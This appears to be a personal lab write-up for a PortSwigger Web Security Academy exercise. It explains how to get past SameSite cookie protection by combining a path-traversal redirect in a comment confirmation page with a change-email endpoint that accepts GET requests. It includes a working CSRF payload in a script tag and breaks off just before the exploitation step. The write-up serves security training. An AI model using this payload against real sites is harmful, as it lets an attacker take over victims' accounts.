This lab's change email function is vulnerable to CSRF. To solve the lab, perform a [CSRF attack](https://portswigger.net/web-security/csrf) that changes the victim's email address. You should use the provided exploit server to host your attack.

# Vuln assessment

First find the redirect vulnerability.

Note that when a comment is posted the following request is issued:

![[redirect.png]]

It defines the `href` attribute of an HTML link element. It's possible to redirect the user to the `/my-account` page defining the `postId` parameter as:

```
3/../../my-account
```

Now the way to bypass `SameSite` restrictions is to note that the request to change the user email accepts both `GET & POST` methods and parameters. Knowing this it's possible to craft an exploit:

```html
<script>
    document.location = "https://0ae500bf03f4d03180d4d0e1004b0066.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=test4%40test.com%26submit=1";
</script>
```

The important part is here:

```
my-account/change-email?email=test1%40test.com%26submit=1
```

Which successfully executes the request to change the user email. 

# Exploitation

Now define an unused email and paste the payload in the exploit server:

